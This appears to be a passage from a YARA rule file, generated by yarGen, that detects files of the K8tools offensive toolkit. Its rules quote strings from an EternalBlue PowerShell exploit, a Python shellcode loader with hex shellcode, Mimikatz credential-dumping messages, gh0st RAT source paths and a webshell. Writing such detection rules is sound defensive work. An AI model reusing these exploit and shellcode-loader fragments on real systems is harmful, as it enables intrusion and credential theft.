      $s9 = "QwOLgZ1OZixjLErMj8.EDtEGKY7QEo0e38mZq+Q2TxoUUmQmAdNCJkus+OKQo7KJqEsqhrmrCfZ`1[[System.Object, mscorlib, Version=2.0.0.0, Culture" ascii /* score: '18.00'*/
      $s10 = "EPyVLAHZ7" fullword ascii /* base64 encoded string '?%K v{' */ /* score: '15.00'*/
      $s11 = "PostFile" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s12 = "sejQlL1Yg" fullword ascii /* base64 encoded string 'z4%/V ' */ /* score: '14.00'*/
      $s13 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s14 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s15 = "httpPost" fullword ascii /* score: '12.00'*/
      $s16 = "iLyxmMn1lFAKEywmf8" fullword ascii /* score: '12.00'*/
      $s17 = "K8_JbossExp.pdb" fullword ascii /* score: '11.00'*/
      $s18 = "PostSubmit2" fullword ascii /* score: '10.00'*/
      $s19 = "IrCHy0FE8C" fullword ascii /* score: '9.00'*/
      $s20 = "PostSubmit" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule MS17010EXP {
   meta:
      description = "K8tools - file MS17010EXP.ps1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7a5354a814947d5627041eb10ba95ad48feea4d77b9082fba7d08037359f5c41"
   strings:
      $x1 = "Invoke-EternalBlue -Target 127.0.0.1  -InitialGrooms 12 -MaxAttempts 12 -Shellcode @(0x90,0x90,0xC3)" fullword ascii /* score: '39.42'*/
      $s2 = "$shellcode = make_kernel_user_payload($payload)" fullword ascii /* score: '26.00'*/
      $s3 = "$pkt += 0x00 * ($pkt_max_payload - $kernel_user_payload.length)" fullword ascii /* score: '25.00'*/
      $s4 = "function smb_eternalblue($Target, $grooms, $Shellcode) {" fullword ascii /* score: '23.00'*/
      $s5 = "function make_kernel_shellcode {" fullword ascii /* score: '23.00'*/
      $s6 = "# initialize_groom_threads(ip, port, payload, grooms)" fullword ascii /* score: '23.00'*/
      $s7 = "$sc = make_kernel_shellcode" fullword ascii /* score: '23.00'*/
      $s8 = "Based on Eternal Blue metasploit module by Sean Dillon <sean.dillon@risksense.com>',  " fullword ascii /* score: '23.00'*/
      $s9 = "smb_eternalblue $Target $grooms $Shellcode" fullword ascii /* score: '23.00'*/
      $s10 = "# Neither Rex nor RubySMB appear to support Anon login?" fullword ascii /* score: '22.00'*/
      $s11 = "PowerShell port of MS17_010 Metasploit module" fullword ascii /* score: '21.01'*/
      $s12 = "function make_kernel_user_payload($ring3) {" fullword ascii /* score: '21.00'*/
      $s13 = "function make_smb2_payload_body_packet($kernel_user_payload) {" fullword ascii /* score: '21.00'*/
      $s14 = "function Invoke-EternalBlue($Target, $InitialGrooms, $MaxAttempts){" fullword ascii /* score: '21.00'*/
      $s15 = ".PARAMETER ShellCode" fullword ascii /* score: '21.00'*/
      $s16 = "$pkt += $kernel_user_payload" fullword ascii /* score: '21.00'*/
      $s17 = "#replace your shellcode (default is blue screen)" fullword ascii /* score: '21.00'*/
      $s18 = "#replace null bytes with your shellcode" fullword ascii /* score: '21.00'*/
      $s19 = "$raw, $smbheader = smb1_anonymous_login $sock" fullword ascii /* score: '20.00'*/
      $s20 = "$client = New-Object System.Net.Sockets.TcpClient($Target,445)" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4c23 and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule K8_ipcscan_______IPC_________________________ {
   meta:
      description = "K8tools - file K8_ipcscan 爆破IPC自动种马工具+教程.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "30b3ebf9e60513249fe5328604c42ea66f6908ec6639cfcbe141310a08b58e75"
   strings:
      $s1 = "\\IpcScan\\IpcScan.exe" fullword ascii /* score: '17.42'*/
      $s2 = "\\IpcScan\\pass.txt" fullword ascii /* score: '16.00'*/
      $s3 = "\\IpcScan\\user.txt" fullword ascii /* score: '16.00'*/
      $s4 = "\\IpcScan\\ip.txt" fullword ascii /* score: '13.00'*/
      $s5 = "pass1111" fullword ascii /* score: '8.00'*/
      $s6 = "pass555\\" fullword ascii /* score: '7.00'*/
      $s7 = "\\IpcScan" fullword ascii /* score: '6.00'*/
      $s8 = "\\K8_ipcscan" fullword ascii /* score: '6.00'*/
      $s9 = "K8_ipcscan " fullword ascii /* score: '5.42'*/
      $s10 = "Administrator" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.96'*/ /* Goodware String - occured 45 times */
      $s11 = ".[=33&mfvT\\ `r" fullword ascii /* score: '4.00'*/
      $s12 = "MTSZ\\AV@" fullword ascii /* score: '4.00'*/
      $s13 = "ErDJ;!g" fullword ascii /* score: '4.00'*/
      $s14 = ".UgD=6" fullword ascii /* score: '4.00'*/
      $s15 = "IRbQh?$;@V" fullword ascii /* score: '4.00'*/
      $s16 = "pas222" fullword ascii /* score: '2.00'*/
      $s17 = "pas333" fullword ascii /* score: '2.00'*/
      $s18 = "hMh>G " fullword ascii /* score: '1.42'*/
      $s19 = "7lg; K" fullword ascii /* score: '1.00'*/
      $s20 = "&Km>QYC>e" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      8 of them
}

rule pre_commit {
   meta:
      description = "K8tools - file pre-commit.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "12c723235131f1c5576c652ac2a0a007f261a93c0ddc445b1dcee6cd98e30788"
   strings:
      $s1 = "# even required, for portability to Solaris 10's /usr/bin/tr), since" fullword ascii /* score: '18.00'*/
      $s2 = "# An example hook script to verify what is about to be committed." fullword ascii /* score: '17.00'*/
      $s3 = "Error: Attempt to add a non-ASCII file name." fullword ascii /* score: '14.00'*/
      $s4 = "if git rev-parse --verify HEAD >/dev/null 2>&1" fullword ascii /* score: '13.00'*/
      $s5 = "exec 1>&2" fullword ascii /* score: '12.00'*/
      $s6 = "exec git diff-index --check --cached $against --" fullword ascii /* score: '12.00'*/
      $s7 = "# them from being added to the repository. We exploit the fact that the" fullword ascii /* score: '12.00'*/
      $s8 = "allownonascii=$(git config --bool hooks.allownonascii)" fullword ascii /* score: '11.17'*/
      $s9 = "# it wants to stop the commit." fullword ascii /* score: '11.00'*/
      $s10 = "# Initial commit: diff against an empty tree object" fullword ascii /* score: '11.00'*/
      $s11 = "# If there are whitespace errors, print the offending file names and fail." fullword ascii /* score: '11.00'*/
      $s12 = "# To enable this hook, rename this file to \"pre-commit\"." fullword ascii /* score: '11.00'*/
      $s13 = "LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0" fullword ascii /* score: '9.00'*/
      $s14 = "against=HEAD" fullword ascii /* score: '9.00'*/
      $s15 = "# Cross platform projects tend to avoid non-ASCII filenames; prevent" fullword ascii /* score: '8.00'*/
      $s16 = "test $(git diff --cached --name-only --diff-filter=A -z $against |" fullword ascii /* score: '8.00'*/
      $s17 = "# Redirect output to stderr." fullword ascii /* score: '8.00'*/
      $s18 = "# Note that the use of brackets around a tr range is ok here, (it's" fullword ascii /* score: '8.00'*/
      $s19 = "# the square bracket bytes happen to fall in the designated range." fullword ascii /* score: '8.00'*/
      $s20 = "# printable range starts at the space character and ends with tilde." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      8 of them
}

rule Ladon6_1 {
   meta:
      description = "K8tools - file Ladon6.1.zip"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "18d2e639d57fb19535f64368ef3ecf6ef28bcfa658bbfd1086eccf197d0d13af"
   strings:
      $s1 = "Ladon40.exeUT" fullword ascii /* score: '11.00'*/
      $s2 = "Ladon.exeUT" fullword ascii /* score: '11.00'*/
      $s3 = "smbhash.iniUT" fullword ascii /* score: '10.00'*/
      $s4 = ".wvs:\\" fullword ascii /* score: '10.00'*/
      $s5 = "smbhash.PNGUT" fullword ascii /* score: '10.00'*/
      $s6 = "KaliLadonProxy.PNGUT" fullword ascii /* score: '10.00'*/
      $s7 = "* \"]\" " fullword ascii /* score: '9.42'*/
      $s8 = "__MACOSX/cs4/._CS4_LadonGetinfo.PNGUT" fullword ascii /* score: '9.17'*/
      $s9 = "* NVbw" fullword ascii /* score: '9.00'*/
      $s10 = "QgeTw5i" fullword ascii /* score: '9.00'*/
      $s11 = "cs4/CS4_LadonGetinfo.PNGUT" fullword ascii /* score: '9.00'*/
      $s12 = "__MACOSX/._Ladon40.exeUT" fullword ascii /* score: '8.17'*/
      $s13 = "__MACOSX/._Ladon.exeUT" fullword ascii /* score: '8.17'*/
      $s14 = "__MACOSX/._smbhash.PNGUT" fullword ascii /* score: '7.17'*/
      $s15 = "__MACOSX/._KaliLadonProxy.PNGUT" fullword ascii /* score: '7.17'*/
      $s16 = "d:\\:D:" fullword ascii /* score: '7.00'*/
      $s17 = "DiyIniPwd.PNGUT" fullword ascii /* score: '7.00'*/
      $s18 = "Ladon.cnaUT" fullword ascii /* score: '7.00'*/
      $s19 = "-#'L:\\K-~" fullword ascii /* score: '7.00'*/
      $s20 = "OswSBIn" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      8 of them
}

rule K8tools_ungzip {
   meta:
      description = "K8tools - file ungzip.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0863bbf322799413af51944830f1ed21ffc4f5db9d6e26af8fae502878aff863"
   strings:
      $s1 = "gzip.exe" fullword wide /* score: '22.00'*/
      $s2 = "Usage: me.exe gzipFile ungzipFile" fullword wide /* score: '16.00'*/
      $s3 = "ConfuserEx v1.0.0" fullword ascii /* score: '7.00'*/
      $s4 = "The decompressed path you specified already exists and cannot be overwritten." fullword wide /* score: '6.00'*/
      $s5 = "GZipStream" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 31 times */
      $s6 = "System.IO.Compression" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 51 times */
      $s7 = "Console" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.47'*/ /* Goodware String - occured 526 times */
      $s8 = "Module" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.14'*/ /* Goodware String - occured 856 times */
      $s9 = "5192eaacb8f5" ascii /* score: '4.00'*/
      $s10 = "$0a5f49f0-96fc-42fa-b74f-5192eaacb8f5" fullword ascii /* score: '4.00'*/
      $s11 = "K!!KN)KN1KN9KNAKNIKNQKNYK{aKNiKNqK" fullword wide /* score: '4.00'*/
      $s12 = "ConfusedByAttribute" fullword ascii /* score: '4.00'*/
      $s13 = "=wUQWEYv" fullword ascii /* score: '4.00'*/
      $s14 = "System.Runtime.CompilerServices" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.05'*/ /* Goodware String - occured 1950 times */
      $s15 = "System.Reflection" fullword ascii /* PEStudio Blacklist: strings */ /* score: '2.81'*/ /* Goodware String - occured 2186 times */
      $s16 = "  2018" fullword wide /* score: '1.17'*/
      $s17 = "]?|aQk" fullword ascii /* score: '1.00'*/
      $s18 = "2018" ascii /* score: '1.00'*/
      $s19 = "!;-s/P'" fullword ascii /* score: '1.00'*/
      $s20 = "S.;c.3S.+]" fullword wide /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      8 of them
}

rule K8_________________________20150801_K_8_ {
   meta:
      description = "K8tools - file K8正方密码解密工具_20150801[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "aabea38d6fef326c610fa94af4385f75d371d04f61916e42a837e1de15376b5c"
   strings:
      $s1 = "K8_zfsoftDecode.exe" fullword ascii /* score: '21.00'*/
      $s2 = "1g\\N:\\d" fullword ascii /* score: '7.00'*/
      $s3 = "gzxpth" fullword ascii /* score: '5.00'*/
      $s4 = "JflLQOc" fullword ascii /* score: '4.00'*/
      $s5 = "%UHCX!" fullword ascii /* score: '4.00'*/
      $s6 = "efSz>Lv" fullword ascii /* score: '4.00'*/
      $s7 = "XwDa!,|!d" fullword ascii /* score: '4.00'*/
      $s8 = "kyINoQ&n" fullword ascii /* score: '4.00'*/
      $s9 = "%XNzbb}D" fullword ascii /* score: '4.00'*/
      $s10 = ".Jxf&&" fullword ascii /* score: '4.00'*/
      $s11 = "eU.weG" fullword ascii /* score: '4.00'*/
      $s12 = "pvKc;l({" fullword ascii /* score: '4.00'*/
      $s13 = "TkwC[)[" fullword ascii /* score: '4.00'*/
      $s14 = "jcmoDiH" fullword ascii /* score: '4.00'*/
      $s15 = "DgnYM1!" fullword ascii /* score: '4.00'*/
      $s16 = "HboOO8C" fullword ascii /* score: '4.00'*/
      $s17 = "\\2V0V*" fullword ascii /* score: '2.00'*/
      $s18 = "\\#iPn9~" fullword ascii /* score: '2.00'*/
      $s19 = "\\Y cQ{" fullword ascii /* score: '2.00'*/
      $s20 = "y8b5o " fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule K8tools_mz {
   meta:
      description = "K8tools - file mz.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ca53a44687045e8412586bbc9ff54e834c629187c11810608c8dfdc7503d55b6"
   strings:
      $x1 = "ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide /* score: '46.00'*/
      $x2 = "ERROR kuhl_m_lsadump_lsa ; kull_m_process_getVeryBasicModuleInformationsForName (0x%08x)" fullword wide /* score: '37.00'*/
      $x3 = "ERROR kuhl_m_lsadump_getUsersAndSamKey ; kuhl_m_lsadump_getSamKey KO" fullword wide /* score: '37.00'*/
      $x4 = "ERROR kuhl_m_lsadump_getComputerAndSyskey ; kull_m_registry_RegOpenKeyEx LSA KO" fullword wide /* score: '37.00'*/
      $x5 = "ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply" fullword wide /* score: '37.00'*/
      $x6 = "ERROR kuhl_m_lsadump_trust ; kull_m_process_getVeryBasicModuleInformationsForName (0x%08x)" fullword wide /* score: '37.00'*/
      $x7 = "ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x%08x)" fullword wide /* score: '37.00'*/
      $x8 = "ERROR kuhl_m_lsadump_netsync ; I_NetServerTrustPasswordsGet (0x%08x)" fullword wide /* score: '34.00'*/
      $x9 = "ERROR kuhl_m_dpapi_chrome ; Input 'Login Data' file needed (/in:\"%%localappdata%%\\Google\\Chrome\\User Data\\Default\\Login Da" wide /* score: '34.00'*/
      $x10 = "ERROR kuhl_m_kernel_processProtect ; Argument /process:program.exe or /pid:processid needed" fullword wide /* score: '34.00'*/
      $x11 = "ERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (%hu)" fullword wide /* score: '33.00'*/
      $x12 = "ERROR kuhl_m_lsadump_sam ; kull_m_registry_RegOpenKeyEx (SAM) (0x%08x)" fullword wide /* score: '33.00'*/
      $x13 = "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't match (C:0x%08x - R:0x%08x)" fullword wide /* score: '33.00'*/
      $x14 = "ERROR kuhl_m_lsadump_changentlm ; Argument /oldpassword: or /oldntlm: is needed" fullword wide /* score: '33.00'*/
      $x15 = "livessp.dll" fullword wide /* reversed goodware string 'lld.pssevil' */ /* score: '33.00'*/
      $x16 = "ERROR kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide /* score: '32.00'*/
      $x17 = "ERROR kuhl_m_lsadump_getKeyFromGUID ; kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x" fullword wide /* score: '32.00'*/
      $x18 = "!!! parts after public exponent are process encrypted !!!" fullword wide /* score: '32.00'*/
      $x19 = "ERROR kuhl_m_lsadump_getHash ; RtlEncryptDecryptRC4" fullword wide /* score: '31.00'*/
      $x20 = "ERROR kuhl_m_lsadump_getSamKey ; RtlEncryptDecryptRC4 KO" fullword wide /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      ( pe.imphash() == "175e7c4d4d0e603b12be7d62cc198691" or 1 of ($x*) )
}

rule packed_refs {
   meta:
      description = "K8tools - file packed-refs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "034ea216bbd923e40e8ba744f6999eab78a2fae668d434ec1b6c36fba922958b"
   strings:
      $s1 = "# pack-refs with: peeled fully-peeled sorted " fullword ascii /* score: '8.00'*/
      $s2 = "56c706d3d1001d958b26d4fca2d7d019444ed7e9 refs/remotes/origin/add-license-1" fullword ascii /* score: '5.00'*/
      $s3 = "0deaa0edd05d9c3f4c7ca738edd135efa4ebc589 refs/remotes/origin/master" fullword ascii /* score: '5.00'*/
      $s4 = "0deaa0edd05d9c3f4c7ca738edd135efa4ebc589" ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 1KB and
      all of them
}

rule K8tools_README {
   meta:
      description = "K8tools - file README.md"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c5535c5de8eeeff5f9e3fa680ea2edf1525ac93f41d5401dba91b8beeeaf0a85"
   strings:
      $x1 = "scrun.exe & scrun.py ShellCode" fullword ascii /* score: '31.00'*/
      $x2 = "K8shellcodeLoader.exe Shellcode" fullword ascii /* score: '31.00'*/
      $s3 = "[+] WebShell shellcode.aspx <br>" fullword ascii /* score: '25.00'*/
      $s4 = "CVE-2018-2628 Weblogic GetShell EXPLOIT<br>" fullword ascii /* score: '23.00'*/
      $s5 = "k8cmd.exe<br>" fullword ascii /* score: '23.00'*/
      $s6 = "sshcmd.exe   " fullword ascii /* score: '21.07'*/
      $s7 = "K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar<br>" fullword ascii /* score: '21.00'*/
      $s8 = "JspShellExec CMD" fullword ascii /* score: '21.00'*/
      $s9 = "scrunBase64 ShellCode" fullword ascii /* score: '21.00'*/
      $s10 = "scrunBase32 ShellCode" fullword ascii /* score: '21.00'*/
      $s11 = "GetPassword_x64.rar GetPwd_K8.rar " fullword ascii /* score: '20.42'*/
      $s12 = "[+] Apache 2.2.1.4 mod_isapi exploit.rar<br>" fullword ascii /* score: '20.00'*/
      $s13 = "[![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege)" fullword ascii /* score: '20.00'*/
      $s14 = "sshshell.exe " fullword ascii /* score: '19.42'*/
      $s15 = "udf.dll MYSQL udf" fullword ascii /* score: '19.00'*/
      $s16 = "getvpnpwd.exe VPN" fullword ascii /* score: '19.00'*/
      $s17 = "vncdoor.exe  VNC" fullword ascii /* score: '18.42'*/
      $s18 = "bypassUAC_Win7_10[K8team].rar  13" fullword ascii /* score: '18.42'*/
      $s19 = "bypassUACexe_0419[K8].rar  13" fullword ascii /* score: '18.42'*/
      $s20 = "mz64.exe  Mimikatz-2.1.1-20181209 X64 " fullword ascii /* score: '18.17'*/
   condition:
      uint16(0) == 0x2023 and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule K8tools__git_HEAD {
   meta:
      description = "K8tools - file HEAD"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "f6f2b945f6c411b02ba3da9c7ace88dcf71b6af65ba2e0d89aa82900042b5a10"
   strings:
      $s1 = "ref: refs/heads/master" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6572 and filesize < 1KB and
      all of them
}

rule ______2008_64______UAC___gh0st_______K8team_ {
   meta:
      description = "K8tools - file 支持2008 64位过UAC的gh0st源码[K8team].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "73946d10d2b62f634c87e69fae1b07ac36c67a09c6c5d7090e24b13cc74b8efc"
   strings:
      $s1 = "\\Server\\common\\login.h" fullword ascii /* score: '19.00'*/
      $s2 = "\\gh0st\\res\\cmdshell.ico" fullword ascii /* score: '16.17'*/
      $s3 = "\\Server\\common\\ScreenSpy.cpp" fullword ascii /* score: '16.00'*/
      $s4 = "\\Server\\common\\ShellManager.cpp" fullword ascii /* score: '16.00'*/
      $s5 = "\\Server\\common\\KernelManager.cpp" fullword ascii /* score: '16.00'*/
      $s6 = "\\Server\\common\\keylog.h" fullword ascii /* score: '16.00'*/
      $s7 = "\\gh0st\\ReadMe.txt" fullword ascii /* score: '15.00'*/
      $s8 = "\\gh0st\\CJ60Lib\\CJ60Lib\\readme.txt" fullword ascii /* score: '15.00'*/
      $s9 = "\\Server\\ReadMe.txt" fullword ascii /* score: '15.00'*/
      $s10 = "\\Server\\common\\KeyboardManager.cpp" fullword ascii /* score: '14.00'*/
      $s11 = "\\Server\\common\\SystemManager.cpp" fullword ascii /* score: '14.00'*/
      $s12 = "\\Server\\common\\Dialupass.cpp" fullword ascii /* score: '14.00'*/
      $s13 = "\\Server\\common\\NetUser.h" fullword ascii /* score: '14.00'*/
      $s14 = "\\gh0st\\ScreenSpyDlg.cpp" fullword ascii /* score: '13.42'*/
      $s15 = "\\gh0st\\ShellDlg.cpp" fullword ascii /* score: '13.42'*/
      $s16 = "\\gh0st\\errlog.cpp" fullword ascii /* score: '13.42'*/
      $s17 = "\\gh0st\\include\\CpuUsage.cpp" fullword ascii /* score: '13.17'*/
      $s18 = "\\gh0st\\CJ60Lib\\CJ60Lib\\ShellTree.cpp" fullword ascii /* score: '13.07'*/
      $s19 = "\\gh0st\\CJ60Lib\\CJ60Lib\\CJFlatHeaderCtrl.cpp" fullword ascii /* score: '13.07'*/
      $s20 = "\\gh0st\\CJ60Lib\\CJ60Lib\\ShellPidl.cpp" fullword ascii /* score: '13.07'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule K8outSQL {
   meta:
      description = "K8tools - file K8outSQL.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "bcc123dfa6267340f7a99f63d5deb277e7b8065335867459c4099bc58eaaf885"
   strings:
      $x1 = "Copyright &copy; 2011 - <a href=\"http://qqhack8.blog.163.com\" target=\"_blank\">http://qqhack8.blog.163.com</a>" fullword ascii /* score: '40.00'*/
      $s2 = "SqlDataReader k8show = K8Ins.ExecuteReader();" fullword ascii /* score: '22.17'*/
      $s3 = "<span style=\"float: right; margin-left: 7px;\"><a href=\"http://qqhack8.blog.163.com\"" fullword ascii /* score: '22.00'*/
      $s4 = "K8login.Visible = false;" fullword ascii /* score: '18.17'*/
      $s5 = "K8login.Visible = true;" fullword ascii /* score: '18.17'*/
      $s6 = "private void K8loginOK()" fullword ascii /* score: '18.00'*/
      $s7 = "private void K8loginNO()" fullword ascii /* score: '18.00'*/
      $s8 = "Response.Cookies.Add(new HttpCookie(k8yes, null));" fullword ascii /* score: '16.00'*/
      $s9 = "Response.Cookies.Add(new HttpCookie(k8yes, k8pwd));" fullword ascii /* score: '16.00'*/
      $s10 = "K8loginNO(); " fullword ascii /* score: '15.42'*/
      $s11 = "OnClick=\"K8loginChk\" Width=\"87px\" BorderColor=\"Lime\" />" fullword ascii /* score: '15.00'*/
      $s12 = "s.txt_SaUser.Text.Trim() + \";pwd=\" + this.txt_Pass.Text.Trim();" fullword ascii /* score: '15.00'*/
      $s13 = "<div id=\"K8login\" runat=\"server\" style=\"border: 1px solid #006600; margin: 20px auto;" fullword ascii /* score: '15.00'*/
      $s14 = "protected void K8loginChk(object sender, EventArgs e)" fullword ascii /* score: '15.00'*/
      $s15 = "K8loginOK();" fullword ascii /* score: '15.00'*/
      $s16 = "K8connString = \"server=\" + this.txt_SQLserver.Text.Trim() + \";database=\" + this.txt_Database.Text.Trim() + \";uid=\" + this." ascii /* score: '15.00'*/
      $s17 = "target=\"_blank\">Crack8" fullword ascii /* score: '14.00'*/
      $s18 = "<%@ import Namespace=\"System.Data\"%>" fullword ascii /* score: '14.00'*/
      $s19 = "<%@ Import Namespace=\"System.Data.SqlClient\"%>" fullword ascii /* score: '14.00'*/
      $s20 = "K8dataGridView.DataBind();" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule K8tools_scrun_2 {
   meta:
      description = "K8tools - file scrun.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a545a712256100507284fc9bc253706348ad0ae95972f0940dad02cc16a5b73a"
   strings:
      $s1 = "ctypes.c_int(len(shellcode))," fullword ascii /* score: '18.00'*/
      $s2 = "ctypes.c_int(len(shellcode)))" fullword ascii /* score: '18.00'*/
      $s3 = "buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)" fullword ascii /* score: '18.00'*/
      $s4 = "shellcode=bytearray(sys.argv[1].decode(\"hex\"))" fullword ascii /* score: '18.00'*/
      $s5 = "#calc.exe" fullword ascii /* score: '15.00'*/
      $s6 = "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr)," fullword ascii /* score: '12.00'*/
      $s7 = "ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0)," fullword ascii /* score: '12.00'*/
      $s8 = "ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))" fullword ascii /* score: '12.00'*/
      $s9 = "511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50E" ascii /* score: '10.00'*/
      $s10 = "ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0)," fullword ascii /* score: '9.00'*/
      $s11 = "ctypes.pointer(ctypes.c_int(0)))" fullword ascii /* score: '7.00'*/
      $s12 = "#scrun by k8gege" fullword ascii /* score: '7.00'*/
      $s13 = "E93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F596" ascii /* score: '7.00'*/
      $s14 = "95B57F380BE6621F6CBDBF57C99D77ED" ascii /* score: '6.00'*/
      $s15 = "#sc = \"DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD" ascii /* score: '4.03'*/
      $s16 = "#sc = \"DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD" ascii /* score: '4.03'*/
      $s17 = "ctypes.c_int(ptr)," fullword ascii /* score: '4.00'*/
      $s18 = "ctypes.c_int(0)," fullword ascii /* score: '4.00'*/
      $s19 = "ctypes.c_int(0x3000)," fullword ascii /* score: '4.00'*/
      $s20 = "ctypes.c_int(0x40))" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x7323 and filesize < 4KB and
      8 of them
}

rule description {
   meta:
      description = "K8tools - file description"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "85ab6c163d43a17ea9cf7788308bca1466f1b0a8d1cc92e26e9bf63da4062aee"
   strings:
      $s1 = "Unnamed repository; edit this file 'description' to name the repository." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6e55 and filesize < 1KB and
      all of them
}

rule MS14068_EXP__________________ {
   meta:
      description = "K8tools - file MS14068 EXP域内提权神器.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "83c076e7cae6a922acde29f568b29d8a841a79486359bcb71fb205aa0e608b56"
   strings:
      $s1 = "MS14068 EXP\\ttcmd.bat" fullword ascii /* score: '14.42'*/
      $s2 = "MS14068 EXP\\kek\\_crypto\\MD4.pyimport hashlib" fullword ascii /* score: '10.00'*/
      $s3 = "MS14068 EXP\\kek\\_crypto\\MD5.pyimport hashlib" fullword ascii /* score: '10.00'*/
      $s4 = "MS14068 EXP\\pyasn1\\type\\error.pyfrom pyasn1.error import PyAsn1Error" fullword ascii /* score: '10.00'*/
      $s5 = "return hashlib.new('md4', *args)" fullword ascii /* score: '10.00'*/
      $s6 = "MS14068 EXP\\pyasn1\\compat" fullword ascii /* score: '7.17'*/
      $s7 = "MS14068 EXP\\pyasn1\\compat\\octets.py" fullword ascii /* score: '7.07'*/
      $s8 = "MS14068 EXP\\pyasn1\\error.py" fullword ascii /* score: '7.00'*/
      $s9 = "MS14068 EXP\\README.md" fullword ascii /* score: '7.00'*/
      $s10 = "binn;&Ej" fullword ascii /* score: '7.00'*/
      $s11 = "return hashlib.md5(*args)" fullword ascii /* score: '7.00'*/
      $s12 = "MS14068 EXP\\pyasn1\\compat\\__init__.py# This file is necessary to make this directory a package." fullword ascii /* score: '7.00'*/
      $s13 = "MS14068 EXP\\pyasn1\\codec\\ber\\decoder.py" fullword ascii /* score: '6.03'*/
      $s14 = "MS14068 EXP\\pyasn1\\codec\\cer\\decoder.py" fullword ascii /* score: '6.03'*/
